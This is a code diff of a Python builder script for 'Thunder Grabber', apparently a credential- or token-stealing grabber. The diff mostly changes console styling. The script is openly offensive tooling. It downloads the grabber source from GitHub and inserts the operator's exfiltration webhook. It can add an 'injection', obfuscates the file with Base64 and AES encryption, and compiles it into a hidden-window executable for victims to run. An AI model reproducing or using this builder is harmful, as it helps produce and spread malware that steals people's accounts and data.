@@ -1,69 +1,74 @@
+from asyncore import write
+from tkinter import W
 import requests
 import os
 import shutil
 from colorama import Fore
 import time
-import encryption
-from encryption import Base64_encode, AES_encrypt
+from pystyle import Anime, Colorate, Colors, Center, System, Write
+import Base64_encode, AES_encrypt
 from os.path import exists
 
-def black(text):
-    os.system(""); faded = ""
-    red = 0; green = 0; blue = 0
+def blue(text):
+    os.system(""); fade = "" 
+    red = 255
     for line in text.splitlines():
-        faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
-        if not red == 255 and not green == 255 and not blue == 255:
-            red += 20; green += 20; blue += 20
-            if red > 255 and green > 255 and blue > 255:
-                red = 255; green = 255; blue = 255
-    return faded
+        fade += (f"\033[38;2;{red};0;180m{line}\033[0m\n")
+        if not red == 0:
+            red -= 20
+            if red < 0:
+                red = 0
+    return fade
+
 
 def main():
     global tempfolder
     os.system('cls')
-    print(black("""
+    print(blue("""
                                     ████████╗██╗  ██╗██╗   ██╗███╗   ██╗██████╗ ███████╗██████╗      
                                     ╚══██╔══╝██║  ██║██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗     
                                        ██║   ███████║██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝     
                                        ██║   ██╔══██║██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗     
                                        ██║   ██║  ██║╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║     
-                                       ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝     
-                                                    Builder For Thunder Grabber
-                                                       Made By TWISTX7#9122               
+                                       ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
+                                             https://github.com/TWIST-X7/Thunder-Grabber     
+                                                     Builder For Thunder Grabber
+                                                        Made By TWISTX7#9122               
 """))
-    webhook = input(f"{Fore.CYAN}Webhook URL: {Fore.RESET}")
-    print(f"{Fore.YELLOW}Checking Webhbook...{Fore.RESET}")
+    webhook = Write.Input("Webhook URL -> ",
+                          Colors.purple_to_blue,interval=0.005, input_color=Colors.white)
+    Write.Print("Checking Webhbook...\n",Colors.purple_to_red,interval=0.005)
     time.sleep(0.5)
     r = requests.get(webhook)
     if r.status_code == 200:
-        print(f"{Fore.GREEN}Valid Webhook!{Fore.RESET}")
+        Write.Print("Valid Webhook!\n",Colors.green,interval=0.005)
     else:
-        print(f"{Fore.RED}Invalid Webhook!{Fore.RESET}")
-        print("Press enter to continue")
+        Write.Print("Invalid Webhook!\n",Colors.red,interval=0.005)
+        Write.Print("Press enter to continue...",Colors.white,interval=0.005)
         input()
         main()
     
-    grabbername = input(f"{Fore.CYAN}Grabber name: {Fore.RESET}")
+    grabbername = Write.Input(f"Grabber name -> ",Colors.purple_to_blue,interval=0.005, input_color=Colors.white)
     tempfolder = os.getenv("temp")+"\\Thunder"
     try:
         os.mkdir(os.path.join(tempfolder))
     except Exception:
         pass
     raw = requests.get('https://raw.githubusercontent.com/TWIST-X7/Thunder-Grabber/main/thunder.py').text
-    inj = str(input(f"{Fore.CYAN}Add Injection? (y/n): {Fore.RESET}")).lower()
+    inj = str(Write.Input(f"Add Injection? (y/n): ", Colors.purple_to_blue,interval=0.005, input_color=Colors.white)).lower()
     if inj == "n":
         with open(f"{tempfolder}\\{grabbername}.py", "w", encoding="utf-8") as f:
-            print(f"{Fore.YELLOW}No Injection{Fore.RESET}")
+            Write.Print(f"No Injection!\n",Colors.purple_to_red,interval=0.005)
             f.write(raw.replace("YOUR_WEBHOOK", webhook))
             f.close()  
     elif inj == "y":
         with open(f"{tempfolder}\\{grabbername}.py", "w", encoding="utf-8") as f:
-            print(f"{Fore.YELLOW}Injecting...{Fore.RESET}")
+            Write.Print(f"Injecting...\n",Colors.purple_to_red,interval=0.005)
             f.write(raw.replace("YOUR_WEBHOOK", webhook).replace("YES_NO", "y"))   
             f.close
-    enc = input(f"{Fore.CYAN}Encrypt? (y/n): {Fore.RESET}").lower()
+    enc = Write.Input(f"Encrypt? (y/n): ", Colors.purple_to_blue,interval=0.005, input_color=Colors.white).lower()
     if enc == "y":
-        print(f"{Fore.YELLOW}Start Encrypting....{Fore.RESET}")
+        Write.Print(f"Start Encrypting....\n",Colors.purple_to_red,interval=0.005)
         bypassVM = "n"
         key = "10"
         pathenc = f"{tempfolder}\\{grabbername}.py"
@@ -71,13 +76,13 @@ def main():
         test1 = AES_encrypt.Encryptor(key, pathenc,bypassVM)
         test2.encode(pathenc)
         test1.encrypt_file()
-        print(f"{Fore.GREEN}Encrypting Completed Successfully!{Fore.RESET}")
-    else: print(f"{Fore.YELLOW}No Encrypting{Fore.RESET}")    
-    print(f"{Fore.YELLOW}Checking Requirements...{Fore.RESET}")
+        Write.Print(f"Encrypting Completed Successfully!\n",Colors.green,interval=0.005)
+    else: Write.Print(f"No Encrypting!\n",Colors.purple_to_red,interval=0.005)    
+    Write.Print(f"Checking Requirements...\n",Colors.purple_to_red,interval=0.005)
     os.system("pip install pyinstaller")
     os.system("pip install --upgrade -r requirements.txt")
     filepath = os.getenv("temp")+f"\\Thunder\\{grabbername}.py"
-    print(f"{Fore.YELLOW}Creating Grabber...{Fore.RESET}")
+    Write.Print(f"Creating Grabber...\n",Colors.purple_to_red,interval=0.005)
     os.system(f"pyinstaller --onefile --noconsole -i NONE {filepath}")
     try:
         shutil.move(f"{os.getcwd()}\\dist\\{grabbername}.exe", f"{os.getcwd()}\\{grabbername}.exe")
@@ -89,10 +94,10 @@ def main():
     os.remove(f'{grabbername}.spec')
     shutil.rmtree(tempfolder)
     if exists(f'{grabbername}.exe'):
-        input(f"{Fore.GREEN}{grabbername}.exe Created Successfully{Fore.RESET}\nPress enter to exit...")
+        Write.Input(f"{grabbername}.exe Created Successfully\nPress enter to exit...",Colors.green,interval=0.005, input_color=Colors.white)
         exit()
     else:
-        input(f"{Fore.RED}Error Creating Grabber{Fore.RESET}\nPress enter to exit...")
+        Write.Input(f"Error Creating Grabber\nPress enter to exit...",Colors.red,interval=0.005, input_color=Colors.white)
         exit()
 main()
          
